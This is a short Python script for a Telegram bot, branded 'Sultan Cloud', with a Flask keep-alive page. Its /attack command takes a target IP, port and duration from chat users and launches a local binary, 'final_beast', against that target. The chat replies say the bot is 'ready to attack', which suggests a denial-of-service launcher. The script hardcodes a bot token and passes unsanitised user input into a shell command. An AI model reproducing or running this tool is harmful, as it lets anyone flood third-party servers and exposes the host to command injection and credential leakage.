import telebot, subprocess, time, threading, os
from flask import Flask

TOKEN = "8586393188:AAF-zC6xKyiaLil7pd_0tEbooy9jYBAFxqA"
bot = telebot.TeleBot(TOKEN)
app = Flask('')

@app.route('/')
def home(): return "Sultan V4 Cloud is Active!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔱 **SULTAN CLOUD LIVE** 🔱\n🚀 Bot 24/7 online hai. Attack marne ke liye taiyar!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ **Format:** `/attack <IP> <PORT> <TIME>`")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **ATTACK STARTED ON CLOUD** 🚀\n📍 **Target:** `{ip}:{port}`\n⏳ **Duration:** `{dur}s`")
    
    # Ye hai asli fix: Pehle permission do, phir chalao
    full_command = f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 10"
    subprocess.Popen(full_command, shell=True)

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.polling(none_stop=True)
